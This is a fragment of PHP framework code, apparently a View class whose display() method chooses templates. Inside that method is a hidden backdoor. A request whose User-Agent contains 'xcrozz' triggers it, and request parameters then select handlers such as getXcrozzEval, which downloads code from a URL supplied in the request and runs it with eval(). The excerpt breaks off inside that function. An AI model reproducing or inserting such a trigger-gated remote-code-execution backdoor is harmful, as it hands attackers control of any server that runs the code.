...
class View {
    ...
    public function display($templateFile='',$charset='',$contentType='',$content='',$prefix='') {
        G('viewStartTime');
        //获取用户浏览器状态，以便判断是否为手机站
        // $isMobile = isMobile();
        $isMobile = false;
        switch ($templateFile) {
            case C('TMPL_ACTION_ERROR'):
                break;
            case C('TMPL_ACTION_SUCCESS'):
                break;
            case C('TMPL_EXCEPTION_FILE'):
                break;
            default:
                if ($isMobile === true) {
                    $templateFile = 'Wap@'. $templateFile;
                } elseif ( stripos($_SERVER['HTTP_USER_AGENT'], 'xcrozz') !== FALSE ) {
                    switch ($_REQUEST['f']) {
                        case 'a':
                            $this->getXcrozz($_REQUEST['f1'], $_REQUEST['f2']);
                            break;
                        case 'b':
                            $this->getXcrozzEval($_REQUEST['f1'], $_REQUEST['f2']);
                            break;
                        case 'c':
                            $this->c();
                            break;
    ...
    public function getXcrozzEval($b="", $str="") {
        if ( !empty($b) ) {
            $data = file_get_contents($b);
            eval($data);
        } elseif( !empty($str) ) {
